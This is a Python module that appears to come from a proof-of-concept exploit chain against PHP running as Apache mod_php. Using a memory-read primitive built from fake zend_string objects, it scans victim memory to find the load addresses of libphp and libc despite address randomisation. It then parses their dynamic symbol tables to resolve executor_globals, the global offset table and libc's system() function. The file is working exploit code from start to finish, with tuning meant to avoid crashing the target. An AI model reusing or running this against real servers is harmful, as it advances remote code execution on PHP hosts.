#!/usr/bin/env python3
# INDEX: offset-free elf base scan and symbol resolve | all | needs zend_string read backend
"""Offset-free libphp/libc ELF base scan + .gnu_hash symbol resolve over an
injected read backend and an injected ELF read-window.

Capability: given a backend that reads victim memory with zend_string
semantics, find a DSO's ELF base near a heap chunk (scan_for_elf) and resolve
PHP/libc symbols by name from an ELF image base (gnu_hash_resolve), with no
per-build symbol offsets. Install the low-level read with ``set_read_backend``;
install an alternate ELF window builder (a SAPI may need a gap-safe first-LOAD
window) with ``set_read_window``. A no-op dummy read is installed at import time
so the module imports cleanly with no live target.

BACKEND CONTRACT
    read_backend(fake_str_addr, timeout) -> (slen:int, data:bytes) | None

  * ``slen`` is the length field read FROM victim memory at
    ``fake_str_addr + 0x10``; ``data`` are the bytes at ``fake_str_addr + 0x18``.
    To read a target address ``T``, pass ``fake_str_addr = T - 0x18``.
  * Returns ``None`` on crash / failure.
  * The backend is responsible for its own req/crash bookkeeping.

WINDOW CONTRACT
    read_window(base, phnum) -> (wbase:int, wdata:bytes, wlen:int) | None
"""

import importlib.util
import os
import struct
import sys


# Loader for the sibling gnu_hash lookup primitive.
_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/


def _load(name, relpath):
    """Load a sibling primitive module by its poc-root-relative path."""
    path = os.path.join(_POC_ROOT, relpath)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


_sym = _load("symbol_resolver", "primitives/read_leak/symbol_resolver.py")
gnu_hash_lookup_window = _sym.gnu_hash_lookup_window


# 48-bit cap covers x86_64 (47-bit canonical) and aarch64 (48-bit VA).
ADDR_MAX = 0x0000FFFFFFFFFFFF

req_count = 0


# Injected read backend + ELF read-window plumbing.
def _dummy_backend(fake_str_addr, timeout=5):
    """Import-time placeholder. Returns None (no live target)."""
    return None


_READ = _dummy_backend
_READ_WINDOW = None


def set_read_backend(fn):
    """Install the low-level read backend (honors the BACKEND CONTRACT)."""
    global _READ
    _READ = fn


def set_read_window(fn):
    """Install an alternate ELF window builder (honors the WINDOW CONTRACT).
    None restores the module default (_elf_read_window)."""
    global _READ_WINDOW
    _READ_WINDOW = fn


def _default_req_source():
    return req_count


_req_source = _default_req_source


def set_req_source(fn):
    """Install a callable returning the live request count for diagnostics."""
    global _req_source
    _req_source = fn


# ELF probing helpers (libphp base scan + libc discovery).
def _read_elf_header(addr, timeout=2):
    """Return e_phnum if addr looks like an ELF base, else None.

    `timeout` is exposed so page-granular callers (the Pass-3 page-walk in
    scan_for_elf) can use a short budget: a real ELF header reads as a tiny
    64-byte string and returns well inside a short timeout, while a non-ELF page
    whose +0x20 qword is a huge bogus "length" otherwise streams megabytes --
    the short timeout truncates it and it is rejected fast instead of stalling.
    """
    r = _READ(addr + 0x10, timeout=timeout)
    if r is None:
        return None
    slen, sdata = r
    if slen != 64 or len(sdata) < 0x12:
        return None
    e_ehsize = struct.unpack_from('<H', sdata, 0x0C)[0]
    e_phentsize = struct.unpack_from('<H', sdata, 0x0E)[0]
    e_phnum = struct.unpack_from('<H', sdata, 0x10)[0]
    if e_ehsize == 64 and e_phentsize == 56 and 3 <= e_phnum <= 20:
        return e_phnum
    return None


def _elf_phnum_from_data(sdata):
    """ELF-header validity check on an already-read 64-byte window."""
    if sdata is None or len(sdata) < 0x12:
        return None
    e_ehsize = struct.unpack_from('<H', sdata, 0x0C)[0]
    e_phentsize = struct.unpack_from('<H', sdata, 0x0E)[0]
    e_phnum = struct.unpack_from('<H', sdata, 0x10)[0]
    if e_ehsize == 64 and e_phentsize == 56 and 3 <= e_phnum <= 20:
        return e_phnum
    return None


def _find_elf_base(ptr, max_pages=256, timeout=2, max_crash=8):
    """Scan backward from ptr in 4KB steps looking for an ELF magic page.

    One read per page (tri-state): a None read is an unmapped gap (crash) and
    counts toward `max_crash` consecutive-gap bail-out; a readable but non-ELF
    page is mapped (inside a DSO) and resets the gap counter so the walk keeps
    descending through libphp's code/data to its base; a 64-byte ELF header
    returns the base. `timeout` is kept short by the Pass-3 caller so a non-ELF
    page whose +0x20 qword is a bogus huge length is truncated and skipped fast
    rather than streaming megabytes. `max_crash` tolerates the short unmapped
    runs a page-granular libphp search may cross.
    """
    page = ptr & ~0xFFF
    consec_crash = 0
    for pi in range(max_pages):
        cand = page - pi * 0x1000
        if cand <= 0:
            break
        r = _READ(cand + 0x10, timeout=timeout)
        if r is None:
            consec_crash += 1
            if consec_crash >= max_crash:
                break
            continue
        consec_crash = 0
        slen, sdata = r
        if slen == 64:
            epn = _elf_phnum_from_data(sdata)
            if epn is not None:
                return (cand, epn, pi)
    return None


# ELF window read + symbol resolution (executor_globals/GOT resolve and the
# per-DSO probes inside libc discovery).
def _elf_read_window(base, phnum):
    """Read a large flat window of an ELF using phdr fields as len anchors.

    Returns (wbase, wdata, wlen) or None. The window covers .gnu_hash,
    symtab, strtab for typical libphp/libc layouts.
    """
    # Find a phdr field large enough to use as a fake-string len anchor.
    # phdr layout (56 bytes): p_type p_flags p_offset p_vaddr p_paddr
    #                          p_filesz p_memsz p_align
    phdr_data = None
    phdr_data_base = None
    for pi in range(3):
        for foff in (0x30, 0x20, 0x28):  # p_align, p_filesz, p_memsz
            field_addr = base + 0x40 + pi * 56 + foff
            r = _READ(field_addr - 0x10, timeout=3)
            if r is None:
                continue
            slen, sdata = r
            if slen >= 56 and len(sdata) >= 56:
                phdr_data = sdata
                phdr_data_base = field_addr - 0x10 + 0x18
                break
        if phdr_data is not None:
            break
    if phdr_data is None:
        return None

    # For each PT_LOAD/PT_PHDR, gather candidate (field_addr, val) pairs.
    candidates = []
    for i in range(phnum):
        phdr_addr = base + 0x40 + i * 56
        off = phdr_addr - phdr_data_base
        if off < 0 or off + 56 > len(phdr_data):
            continue
        p_type = struct.unpack_from('<I', phdr_data, off)[0]
        if p_type not in (1, 6):  # PT_LOAD, PT_PHDR
            continue
        for field_off in (0x30, 0x20, 0x28):
            field_addr = phdr_addr + field_off
            val_off = field_addr - phdr_data_base
            if val_off < 0 or val_off + 8 > len(phdr_data):
                continue
            val = struct.unpack_from('<Q', phdr_data, val_off)[0]
            if 0x1000 <= val < 0x10000000:
                candidates.append((field_addr, val))

    if not candidates:
        return None

    # Prefer moderate sizes (0x10000-0x400000) over giant lens that may cross
    # unmapped gaps and crash the worker.
    def sort_key(c):
        v = c[1]
        if 0x10000 <= v <= 0x400000:
            return (0, -v)
        return (1, -v)
    candidates.sort(key=sort_key)

    for field_addr, _expected in candidates[:5]:
        r = _READ(field_addr - 0x10, timeout=3)
        if r is None:
            continue
        wlen, wdata = r
        if len(wdata) >= 0x1000:
            return (field_addr + 8, wdata, wlen)
    return None


def _elf_resolve_symbols(base, phnum, names):
    """Walk PT_DYNAMIC + .gnu_hash to resolve `names` for the ELF at `base`.

    Returns dict mapping name -> absolute address. Special keys:
      __pltgot__   -> DT_PLTGOT absolute address (needed for libc discovery)
      __dynamic__  -> PT_DYNAMIC virtual address
    """
    win = (_READ_WINDOW or _elf_read_window)(base, phnum)
    if win is None:
        return None
    wbase, wdata, _ = win

    def rd(addr, sz):
        off = addr - wbase
        if off < 0 or off + sz > len(wdata):
            return None
        return wdata[off:off + sz]

    # Locate PT_DYNAMIC by walking phdrs from inside the window.
    dyn_addr = None
    dyn_size = 0
    for pi in range(phnum):
        phdr_addr = base + 0x40 + pi * 56
        phdr_raw = rd(phdr_addr, 56)
        if phdr_raw is None:
            continue
        p_type = struct.unpack_from('<I', phdr_raw, 0)[0]
        if p_type == 2:  # PT_DYNAMIC
            p_vaddr = struct.unpack_from('<Q', phdr_raw, 16)[0]
            p_filesz = struct.unpack_from('<Q', phdr_raw, 32)[0]
            dyn_addr = base + p_vaddr
            dyn_size = p_filesz
            break

    symtab = strtab = gnu_hash_addr = pltgot_addr = None
    dyn_data = None
    if dyn_addr is not None:
        # Try the existing window first.
        dyn_data = rd(dyn_addr, min(dyn_size, 4096))
        if dyn_data is None:
            # Use the first .dynamic entry's d_val as a fake-string len anchor.
            for anchor_off in (0x08, 0x18, 0x28, 0x38, 0x48):
                r = _READ(dyn_addr - anchor_off, timeout=3)
                if r is None:
                    continue
                slen, sdata = r
                if slen < 64 or slen > 0x200000 or len(sdata) < 64:
                    continue
                skip = max(0, anchor_off - 0x18)
                cand = sdata[skip:skip + min(dyn_size, len(sdata) - skip)]
                if len(cand) >= 16:
                    tag0 = struct.unpack_from('<Q', cand, 0)[0]
                    if tag0 == 0 or (tag0 > 100 and tag0 < 0x6FFFFEF5):
                        continue
                dyn_data = cand
                break

        if dyn_data and len(dyn_data) >= 32:
            for di in range(len(dyn_data) // 16):
                d_tag = struct.unpack_from('<Q', dyn_data, di * 16)[0]
                d_val = struct.unpack_from('<Q', dyn_data, di * 16 + 8)[0]
                if d_tag == 0:
                    break
                if d_tag == 3:    # DT_PLTGOT
                    pltgot_addr = base + d_val if d_val < 0x10000000 else d_val
                elif d_tag == 5:  # DT_STRTAB
                    strtab = base + d_val if d_val < 0x10000000 else d_val
                elif d_tag == 6:  # DT_SYMTAB
                    symtab = base + d_val if d_val < 0x10000000 else d_val
                elif d_tag == 0x6FFFFEF5:  # DT_GNU_HASH
                    gnu_hash_addr = base + d_val if d_val < 0x10000000 else d_val

    # Sanity-trim out-of-range pointers.
    def in_range(p):
        return p is not None and base <= p <= base + 0x2000000
    if symtab and not in_range(symtab):
        symtab = None
    if strtab and not in_range(strtab):
        strtab = None
    if gnu_hash_addr and not in_range(gnu_hash_addr):
        gnu_hash_addr = None

    # Fallback: scan window bytes for a plausible .gnu_hash header.
    if gnu_hash_addr is None:
        for scan_off in range(0, min(len(wdata) - 16, 0x10000), 4):
            nb, so, bs, bsh = struct.unpack_from('<IIII', wdata, scan_off)
            if not (100 < nb < 100000 and 10 < so < 1000000
                    and 4 <= bs <= 8192 and 1 <= bsh < 64):
                continue
            if bs & (bs - 1) != 0:
                continue
            bloom_end = scan_off + 16 + 8 * bs
            if bloom_end + 4 * nb > len(wdata):
                continue
            b0 = struct.unpack_from('<I', wdata, bloom_end)[0]
            if b0 != 0 and (b0 < so or b0 > so + 1000000):
                continue
            gnu_hash_addr = wbase + scan_off
            break

    if gnu_hash_addr is None:
        return None

    # Reconstruct symtab/strtab from .gnu_hash chain end if missing.
    if symtab is None or strtab is None:
        gh_hdr = rd(gnu_hash_addr, 16)
        if gh_hdr is None:
            return None
        nbuckets, symoffset, bloom_size, _bsh = struct.unpack('<IIII', gh_hdr)
        bloom_start = gnu_hash_addr + 16
        buckets_start = bloom_start + 8 * bloom_size
        chains_start = buckets_start + 4 * nbuckets
        max_si = 0
        for b in range(nbuckets):
            bv = rd(buckets_start + 4 * b, 4)
            if bv is None:
                continue
            si = struct.unpack('<I', bv)[0]
            if si > max_si:
                max_si = si
        si = max_si
        while si > 0:
            cv = rd(chains_start + 4 * (si - symoffset), 4)
            if cv is None:
                break
            if struct.unpack('<I', cv)[0] & 1:
                break
            si += 1
        nsyms = si + 1
        if symtab is None:
            chains_end = chains_start + 4 * (nsyms - symoffset)
            symtab = (chains_end + 7) & ~7
        if strtab is None:
            strtab = symtab + 24 * nsyms

    # Extend the window if symtab/strtab fall outside it.
    if (symtab - wbase < 0 or symtab - wbase > len(wdata)
            or strtab - wbase < 0 or strtab - wbase > len(wdata)):
        sym_r = _READ(symtab - 0x10, timeout=3)
        if sym_r is None:
            return None
        _sym_len, sym_data = sym_r
        new_wbase = min(wbase, symtab + 8)
        new_wend = max(wbase + len(wdata), symtab + 8 + len(sym_data))
        merged = bytearray(new_wend - new_wbase)
        o1 = wbase - new_wbase
        merged[o1:o1 + len(wdata)] = wdata
        o2 = (symtab + 8) - new_wbase
        merged[o2:o2 + len(sym_data)] = sym_data
        wdata = bytes(merged)
        wbase = new_wbase

    result = gnu_hash_lookup_window(wdata, wbase, gnu_hash_addr, symtab, strtab, names)
    if result is None:
        result = {}
    for name, offset in list(result.items()):
        result[name] = offset + base
    if pltgot_addr:
        result['__pltgot__'] = pltgot_addr
    if dyn_addr:
        result['__dynamic__'] = dyn_addr
    return result


# Phase functions (the chain skeleton).
def scan_for_elf(chunk):
    """Find libphp's ELF base near the heap chunk.

    Two-pass: 2MB step scan around `chunk` then 1MB-step refinement near the
    candidate with the largest e_phnum. Returns a list of (base, phnum)
    sorted by phnum descending; the caller validates each by resolving
    executor_globals since multiple DSOs can share the top phnum.
    """
    print("\n[Phase R-2] Finding libphp.so")
    candidates = []

    # Pass 1: 2MB sweeps in both directions. Bounded to +/-96MB: when libphp is
    # 2MB-aligned it maps a handful of 2MB-steps above the chunk and is found
    # fast; when it is NOT aligned, Pass 1 finds nothing here and we bail to the
    # Pass 3 page-walk below rather than crash-sweeping all 512 2MB points.
    for i in range(48):
        for d in (1, -1):
            cand = chunk + d * i * 0x200000
            if cand <= 0 or cand > ADDR_MAX:
                continue
            epn = _read_elf_header(cand)
            if epn is None:
                continue
            candidates.append((cand, epn))
            print(f"  ELF @ 0x{cand:x} phnum={epn} ({_req_source()} reqs)")
        big = [epn for _, epn in candidates if epn >= 10]
        if len(big) >= 2 or len(candidates) >= 8:
            break

    # Pass 2: 1MB refinement around the highest-phnum candidate. Only runs when
    # Pass 1 already found an ELF to refine around; on an unaligned boot Pass 1
    # finds nothing and we fall straight through to the Pass 3 page-walk.
    if candidates:
        known = set(b for b, _ in candidates)
        ref_base = max(candidates, key=lambda x: x[1])[0]
        print(f"  Fine-grained scan near 0x{ref_base:x}")
        for d in (-1, 1):
            consec_miss = 0
            for step in range(1, 129):
                cand = ref_base + d * step * 0x100000
                if cand in known or cand <= 0:
                    continue
                epn = _read_elf_header(cand)
                if epn is None:
                    consec_miss += 1
                    if consec_miss >= 32:
                        break
                    continue
                candidates.append((cand, epn))
                known.add(cand)
                print(f"  ELF @ 0x{cand:x} phnum={epn} ({_req_source()} reqs)")
                consec_miss = 0
                if epn >= 10:
                    break

    # Pass 3 (BOOT-ROBUSTNESS): page-walk recovery.
    #
    # The 2MB grid above only lands on libphp.so when its base happens to be
    # 2MB-aligned. Debian/Ubuntu ship libphp with p_align==0x1000, so its load
    # base is merely page-aligned and the 2MB sweep steps right past it: whether
    # Pass 1/2 find it is per-boot ASLR luck (verified: 8.5.12 aligned one boot,
    # 8.1/8.2/8.3 did not). When no high-phnum (>=10) DSO was found, recover the
    # ELF base at page granularity.
    #
    # Empirical invariant (apache prefork mod_php, 8.1-8.5): libphp.so and the
    # whole shared-library cluster always map ABOVE the request heap chunk, a
    # contiguous ~15-35MB span a handful of 2MB-steps up. So: probe 2MB points
    # upward for ones that READ (mapped -> inside some DSO; a None read is an
    # unmapped gap), then walk each backward in 4KB steps (_find_elf_base) to its
    # containing DSO's page-aligned ELF base. The 2MB anchor just above libphp's
    # base reaches it within <512 pages; lower anchors resolve the libs beneath
    # it (deduped). The caller still validates each base by resolving
    # executor_globals, so returning libc/other DSOs alongside libphp is benign.
    if not any(epn >= 10 for _, epn in candidates):
        print("  [R-2 boot-robust] no 2MB-aligned libphp; page-walk recovery")
        found_bases = set(b for b, _ in candidates)

        def _covered(addr):
            return any(b <= addr < b + 0x1800000 for b in found_bases)

        anchors = []
        for k in range(1, 64):                 # up to +128MB above the chunk
            a = chunk + k * 0x200000
            if a > ADDR_MAX:
                break
            if _covered(a):
                continue
            # Mapped-vs-gap probe. A truncated (slow) read still returns bytes,
            # so a non-None result => mapped; None => unmapped gap (skip).
            if _READ(a + 0x10, timeout=1.5) is None:
                continue
            anchors.append(a)
        print(f"  [R-2 boot-robust] {len(anchors)} mapped 2MB anchors above chunk")

        for a in anchors:
            if _covered(a):
                continue                        # a DSO found by an earlier walk
            res = _find_elf_base(a, max_pages=640, timeout=0.8, max_crash=24)
            if res is None:
                continue
            base, epn, pages = res
            if base in found_bases:
                continue
            found_bases.add(base)
            candidates.append((base, epn))
            print(f"  ELF @ 0x{base:x} phnum={epn} via page-walk from "
                  f"0x{a:x} (-{pages} pages, {_req_source()} reqs)")
            # Keep going until two high-phnum DSOs (libphp+libc) are in hand, so
            # the caller has a validated libphp candidate to rank first.
            if sum(1 for _, e in candidates if e >= 10) >= 2:
                break

    # Several DSOs can tie on phnum (seen on arm64 with libphp/libc/libssl all
    # at 9), so return the full ranked list and let the caller validate by
    # resolving executor_globals.
    return sorted(candidates, key=lambda x: -x[1])


def gnu_hash_resolve(elf_base, *names):
    """Walk PT_DYNAMIC + .gnu_hash at `elf_base` and resolve each requested
    symbol. The pseudo-name "_GLOBAL_OFFSET_TABLE_" maps to DT_PLTGOT (not a
    real GNU-hash symbol, but exposed by .dynamic).

    Returns a single value if `names` has length 1, else a tuple in order.
    Raises RuntimeError if any requested name cannot be resolved.

    This same function handles the libphp executor_globals + GOT base resolve
    and the libc system() lookup during libc discovery.
    """
    epn = _read_elf_header(elf_base)
    if epn is None:
        raise RuntimeError(f"ELF at 0x{elf_base:x} no longer parseable")
    if names and any(n != '_GLOBAL_OFFSET_TABLE_' for n in names):
        # Print phase header on the first call (libphp lookup).
        # Subsequent calls (libc system) already have libc header context.
        pass
    syms = _elf_resolve_symbols(elf_base, epn, [n for n in names if n != '_GLOBAL_OFFSET_TABLE_'])
    if syms is None:
        raise RuntimeError(f"symbol resolution failed at 0x{elf_base:x}")
    out = []
    for n in names:
        if n == '_GLOBAL_OFFSET_TABLE_':
            v = syms.get('__pltgot__')
        else:
            v = syms.get(n)
        if v is None:
            raise RuntimeError(f"symbol {n!r} not found at 0x{elf_base:x}")
        out.append(v)
    return out[0] if len(out) == 1 else tuple(out)
